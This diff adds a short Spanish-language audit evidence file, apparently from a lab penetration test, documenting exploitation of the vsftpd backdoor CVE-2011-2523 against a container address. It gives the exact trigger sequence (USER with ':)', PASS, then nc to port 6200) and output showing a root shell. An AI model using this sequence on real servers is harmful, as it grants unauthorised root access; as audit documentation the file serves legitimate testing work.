@@ -1,0 +1,25 @@
+================================================================
+ Tproot — Evidencia de auditoría (CVE-2011-2523)
+ Fecha (UTC) : 2026-10-18T22:18:01Z
+ Objetivo    : 172.17.0.2
+ Fase        : Fase 2 — Secuencia que abre el shell del backdoor
+ Comando     : USER backdoor:)  ->  PASS backdoor  ->  connect 6200
+ Nota        : El USER solo no basta: hace falta el PASS. La sesion FTP debe permanecer abierta mientras dura la conexion al 6200.
+================================================================
+
+--- 1) USER con la secuencia magica ':)' ---
+$ USER backdoor:)
+331 Please specify the password.
+
+--- 2) PASS (obligatorio: el chequeo ocurre en handle_login) ---
+$ PASS backdoor
+(sin respuesta: el servidor queda colgado lanzando el shell)
+
+--- 3) El puerto 6200 ya escucha ---
+$ ss -tlnp | grep 6200
+LISTEN 0 128 0.0.0.0:6200 0.0.0.0:*
+
+--- 4) Conexion al 6200 -> shell root ---
+$ nc 172.17.0.2 6200
+$ id
+uid=0(root) gid=0(root) groups=0(root)
